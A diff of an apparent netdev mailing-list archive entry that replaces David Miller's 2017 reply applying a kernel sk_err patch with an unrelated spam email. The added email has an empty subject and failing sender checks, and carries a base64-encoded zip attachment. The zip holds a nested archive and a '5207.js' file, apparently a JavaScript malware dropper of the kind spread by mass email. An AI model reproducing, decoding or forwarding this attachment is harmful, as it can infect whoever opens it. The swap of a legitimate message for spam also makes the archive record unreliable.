@@ -1,43 +1,74 @@
-From: David Miller <davem@davemloft.net>
-Subject: Re: [PATCH net] sock: reset sk_err when the error queue is empty
-Date: Sun, 04 Jun 2017 20:02:45 -0400 (EDT)
-Message-ID: <20170604.200245.1799631200856186565.davem@davemloft.net>
-References: <20170602163822.67543-1-soheil.kdev@gmail.com>
+From: <nmckenna@prospercanada.org>
+Subject: (unknown)
+Date: Mon, 05 Jun 2017 00:03:04 -0000
+Message-ID: <149662098489.4332.5124198104391643684@rogers.com>
 Mime-Version: 1.0
-Content-Type: Text/Plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Cc: netdev@vger.kernel.org, chrubis@suse.cz, soheil@google.com,
-        edumazet@google.com, willemb@google.com
-To: soheil.kdev@gmail.com
+Content-Type: application/zip; name="12178296.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from shards.monkeyblade.net ([184.105.139.130]:52698 "EHLO
-        shards.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751181AbdFEACr (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sun, 4 Jun 2017 20:02:47 -0400
-In-Reply-To: <20170602163822.67543-1-soheil.kdev@gmail.com>
+Received: from unallocated-static.rogers.com ([72.143.7.238]:46919 "HELO
+        rogers.com" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751161AbdFEADJ (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sun, 4 Jun 2017 20:03:09 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-From: Soheil Hassas Yeganeh <soheil.kdev@gmail.com>
-Date: Fri,  2 Jun 2017 12:38:22 -0400
-
-> From: Soheil Hassas Yeganeh <soheil@google.com>
-> 
-> Prior to f5f99309fa74 (sock: do not set sk_err in
-> sock_dequeue_err_skb), sk_err was reset to the error of
-> the skb on the head of the error queue.
-> 
-> Applications, most notably ping, are relying on this
-> behavior to reset sk_err for ICMP packets.
-> 
-> Set sk_err to the ICMP error when there is an ICMP packet
-> at the head of the error queue.
-> 
-> Fixes: f5f99309fa74 (sock: do not set sk_err in sock_dequeue_err_skb)
-> Reported-by: Cyril Hrubis <chrubis@suse.cz>
-> Test-by: Cyril Hrubis <chrubis@suse.cz>
-> Signed-off-by: Soheil Hassas Yeganeh <soheil@google.com>
-> Signed-off-by: Eric Dumazet <edumazet@google.com>
-> Signed-off-by: Willem de Bruijn <willemb@google.com>
-
-Applied and queued up for -stable, thank you.
+UEsDBAoAAgAAAAQtxUon2oOCsQsAALELAAAIABwANTIwNy56aXBVVAkAA1eaNFlXmjRZdXgLAAEE
+AAAAAAQAAAAAUEsDBBQAAgAIAAQtxUr8ml6pDQsAAPUiAAAHABwANTIwNy5qc1VUCQADV5o0WVea
+NFl1eAsAAQQAAAAABAAAAADtWsuOG9cRXUuA/kHojdhkw763340JAwQGsgu40HJmCPRTGksaAvTY
+kSHo31On6txukhpB40BIYCS2afb0fdXj1PNy+vW+f7g73L887HbO7dxqh4edS+T/B3mOXzz/9OL5
+s+P48Ovx/iUH9xy8evH884vnU9hidzi4w2G32u0OTh4SmeFkJrf4rT2+lHEnQ7Lu2cPxd/k/BnTk
+bhv9o32IMPKMs7ar+/GfL//O3VcRDpVToyTSCTuHp4MeJU8yiLfyFGi16dfR5m4Tvb3mzNsV/+b8
+21W85nbx7VUUXxKfgIa/HY/t7yufpEmWRNP7w+EYxdfZ7Zdjx/Z+OHzQwTgGLyKeZ3370L9djceY
+/H5e5LnI41SO30EV4EH2sC3mpaoCYdDmP5sOx9XVVaw6MHWYPnTez9tItekOKwhCvq8PetLh9odf
+fu1+eTiu0iSNYyFAJCtyBtFy6q3pUPd4t436t69E5Murh22ELy7aUoKcQNq+ULyJKUoeNpHIus4T
+n1dJ6pPSJT5Nk0b+SKukbJI0qxJfyXhRJt7XSZbKV54UdeKbMk7IyJYbXr/6IJDbvNtEP97cvP6U
+f/7xTZyABuF7exPdRAk53roryIoItjcJ+ZUxvvsLt//h/Xj/5uFteL3ZhKmbTfzpblrxr79uKQTO
+jz8tO34mFZstUCvvBbU/b6L46nO02ZmZreJvPEUrbhIrrAmE2CTdHcf2nT4CjWcQJQbuhIwwforY
+GT5nlh9OPcEZ/nG7C1Pn2y81jOVm2vJ82MmTeQX+fcUtcZDITeev7mJ9/XEbHA8nJNwuviLRHyGB
+PInet7+N0dMMc6b+nE07GIoWvZxwK5qDqVxwy7eX3MrG8q+5L9Wu8Q1Ot4pEL0i8ml2ETr7m1NsV
+Z5pWjZALRxR9AGPihdKneaGF+AtmxUp2pzpVCAn4o/U+S9f7sVzvq269L6b13o3yqdf7ul/vU3nX
+D/Jp1vtJPk7mlvl677P1Ppd5bSHPWO9lfSvr5TudbLyW71LWNrLXIHtNTsZljpNvL/MK2buVsUw+
+E9bndj7G8trWZfLcyLuhkjMqW5t77iF7dbJvBtpkTjHYOtCPPXqhoapJvyP9XJvJWCF/d3iW8VH4
+qJzxlsmzA/0ynsq7WvYbcBboy42nVPYpU5vj5YxW/s46rhc6U5nTdkZHB/pkj24kf/LeQVaV8e97
+460E372dAR6ajOeDltLWQx6l0JeWdu5Ym9ygv1L2KCDj0mRUY56M1fI8DMb/U8+HTnEm9A8e9XzZ
+L4eMwXNu8h+Bkd74qxqjReVfGP2lrG8ov2kw/BSF6QHrQVMJPYBX6Ff2ylvTI/SXjab/vjNeoZci
+NZp9G20EzYLgtjKtAQWgohjJJbioicLCdgQKsatKubTTxtaeJ0ixNCmAAyf7Nc600IIKoXqq7T0o
+BSVFb1YAFI/OUIS10ACoVCk2JgXlAlzK2XnB82WvTr6z1qRQlYZkL99uMO2pFrG+MBRC85CiH03b
+MwoqQ4FqaDIpDrQw8AFLCFrIM9NA0CKQBStWFGXmAWYrrEyO0OLYkP6R/DcL/yr/ivQ3hjLwDBRh
+nz499wLKv7zvvJ3fyft0pIVX9mkCCgOKCtt7Pn8w64OO4CUgB+wJ/UMOtVusQM8HNiry35in6iZb
+r/wDgTLuB+OzqQyt8IYBxZkjCgezosabRYJ/eBPoBRakVkBsgjbQAB0ryoGhNCAY2lQp9obCqred
+lYvJdknl9IaIABU4AfaIOUAzUAxOp858BGwFCARCh9Q0CwRDklNr4zl9pfrywXyYcjhwbLJzmoBi
+SDQ1v+tpi9Ak6AeKq8E4LEcitDdt9vSNNWPBOJr0VYOdzVEr8ESx4/k5fdm3tJierHe2Hr4Qvggy
+guWnmWkR60fGKNcYSqBx9eEnVvyfQ8GfWf8Bwf9Hwf8yCv7M+p8R/A0UICIGFEDrmpc4SiFEfEbk
+tmRGgvXkIHyQF0OKQQsj91VJVSbRiXMgIaAhRENIsm9tT0T0IVvyMo26zKs1r60MBaBDzybaFaGt
+0V9X/+WMpLaMAuuhRZyP7AO583w+swxoEbxoRlWbFeAczQhaoz9NT/gXWXWdfav+RvLfMq9EbTOZ
+jDVnLs/zUtAPK1D9d5a1aD7uDGF1brxgLrKWEvIl4hQ/lG3wAinrJ5V/b/TPGU1tNMJKYfVqhbV5
+AdClumkMZ4H/Vvbq1VMEBGtVRilqdTAYVVrdhJyt5S6UJiTdV4ZUT5tVm6YVYF3LucpFaRz1rET6
+krmZN/QWrAyAuC5YAaToTbOeaACKtTqgJfTBB6aLL2szSsOZ3YLuUJ2oL6qW6kK1SF+r3/TPwRdB
+4+oHa0N4TT5qVrrtY9Wls+pyzIx2RXhp1qIVS076S/MCQImuzY1H+GK15tKqK+gCOTHWqy/rF18E
+HjSv7e2Mglao/HtDsdLvjUaNBV+xAszV6roxpKLK07yeVgT6FIWs7hWF3nCD+kflX9q5oHVKjf4i
+P6lr3An/qCtyWwMvqTquqf/O8urZCh/1ogHB6kvd4kshxZaSg4bLmtXDZJ9TW9TqLDUqFGmZSbOl
+RidGIUhB/SwjUnoR0b97j4I9BYwBjZ6SyEk3fAqkONHvqPTBV05fyDO0nxGqm3SxIsQC5b82+QH9
+hTvp0fR2LlBSZubLtboj37AixIFpWGIRUBS8wJgvNbr2iBqLA1gPHwSPoCioFsSj7wLrgrW17FvA
+wwBFQB/ea1VdmUUAqahCO+xHK9eMYmJG1LBKZCz0Jz0az/O1x0TdajwE34xPmV8ymhCrYQk1+1Xd
+iRdRuXnGy5wdgMG8gFb3J/pDRqXyn/PgnrnbV7mA5FLmNdni0dGjADcakWhDISPRvLA0H9ZTiiEv
+c+xQwZd29Mua10z0lR3Xt+e+3PV/UArMXedOWW20K3pai27qS0vT5FksKImicqnx1UKBthCt/dLp
+mZjPOiJHfVFnZ03luRY9u2O6PnQa6QVyegFdD0SWNqYZTcVY4y2Xzdgxm/PaR7wQrEh9aU0vUi6d
+MsRCxKSAwrnT5ZiXszOo5ze00Jr6cyYTZFPQr2ZELbtx4xKLYGnaqb3oMTWMy7MXm4xux15LiCVa
+l/QWC3zows3yCwj+d6SonTJWB7VfpBgiOmwWVMwZyR/x5fRlkIR2qlpDEdD4zbycEs5DRlBYBaLR
+u10yAkTVy4wmnI91WqHkS16OaKd5YW1WiTM0IufU4hPy2uAfgXRP5JWMptopHOmLaeWQAVAES0Ws
+qEJlB2/iqMWK/HtmRJPFMBfqAiIdvhr9erVidjO1X/uYFzrpdKoPbhdfrhkRO6U91yMjmdePJ+u/
+gsKCXUj1Ipnxr/3m4evVpcYyekHHTmZTBARrXjKxugL3hWkqIFFtsWVexm5yxn6xarFndYBPbn4b
+PlurnMmiFqKXVheV+d6vZfchouWUZrCi6sQXat7Y2AfcY572S91y66BWONEKWta43RKR1Nek7JqH
+iExLc0GCzEgQH7Q6u8woTqozre6CFk/kh3ktexzh1ienP8/pg0N1d1mduilUt3pLfHK7v9t9cXMe
+bqxxbbjbfXF15S4v6OztI780cPZLA7tfvIncxxvcvOrr61cPh9cPx7v7N69uV+d3jOHcJ926zRSd
+ccD7Xv1FgjucXag6/PfIbyc+biOQwx9P2LRH7hxxnScs3fGWdTczGK7FX0ebj5vozfVNNN3gVxI3
+0dv2+JM8crrePWKXmWmuBOskOImOhw8/RWc3ktFhGKP42j/xNxEzn9/nNxHzTyHCfWZ89S9QSwEC
+HgMUAAIACAAELcVK/JpeqQ0LAAD1IgAABwAYAAAAAAABAAAApIEAAAAANTIwNy5qc1VUBQADV5o0
+WXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAAQABAE0AAABOCwAAAABQSwECHgMKAAIAAAAELcVKJ9qD
+grELAACxCwAACAAYAAAAAAAAAAAApIEAAAAANTIwNy56aXBVVAUAA1eaNFl1eAsAAQQAAAAABAAA
+AABQSwUGAAAAAAEAAQBOAAAA8wsAAAAA
